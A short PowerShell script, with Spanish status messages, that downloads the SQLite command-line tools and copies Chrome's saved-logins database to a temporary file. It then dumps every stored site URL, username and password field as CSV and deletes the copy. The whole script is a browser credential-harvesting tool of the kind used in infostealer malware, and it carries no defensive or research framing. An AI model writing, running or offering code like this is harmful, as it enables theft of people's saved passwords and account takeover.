
$sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3420000.zip"

$destFolder = "$env:USERPROFILE\Downloads\sqlite3"

if (-not (Test-Path $destFolder)) {
    New-Item -ItemType Directory -Path $destFolder
}


$zipPath = "$destFolder\sqlite3.zip"
Invoke-WebRequest -Uri $sqliteUrl -OutFile $zipPath


Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $destFolder)


$destFolder = "$env:USERPROFILE\Downloads\sqlite3\sqlite-tools-win32-x86-3420000"
$sqlitePath = "$destFolder\sqlite3.exe"


if (-Not (Test-Path $sqlitePath)) {
    Write-Host "No se encontró sqlite3.exe en: $sqlitePath"
    exit
}


$loginDataPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"


$tempLoginData = "$env:TEMP\LoginData_temp"
Copy-Item -Path $loginDataPath -Destination $tempLoginData


function Invoke-SQLiteQuery {
    param (
        [string]$sqlitePath,
        [string]$dbPath,
        [string]$query
    )

   
    & $sqlitePath $dbPath ".mode csv" ".headers on" $query
}


$query = "SELECT origin_url, username_value, password_value FROM logins"


Invoke-SQLiteQuery -sqlitePath $sqlitePath -dbPath $tempLoginData -query $query


Remove-Item -Path $tempLoginData